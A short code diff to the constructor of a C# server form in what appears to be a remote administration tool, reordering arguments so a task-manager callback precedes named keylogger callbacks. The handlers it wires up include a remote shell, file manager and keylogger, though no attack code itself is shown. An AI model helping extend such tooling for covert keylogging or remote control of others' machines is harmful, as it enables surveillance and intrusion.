@@ -38,10 +38,10 @@ namespace Server.Forms
         {
             InitializeComponent();
             _packetHandler = new PacketHandler(OnSystemInfoResponse, OnRemoteShellResponse, OnFileManagerResponse, OnMessageBoxResponse, OnShutdownActionResponse,
-                onKeyLoggerEvent: OnKeyLoggerEvent,
+				OnTaskManagerResponse,
+				onKeyLoggerEvent: OnKeyLoggerEvent,
                 onKeyLoggerBatch: OnKeyLoggerBatch,
-                onKeyLoggerComboEvent: OnKeyLoggerComboEvent,
-                OnTaskManagerResponse);
+                onKeyLoggerComboEvent: OnKeyLoggerComboEvent);
             InitializeClientsGrid();
         }
 
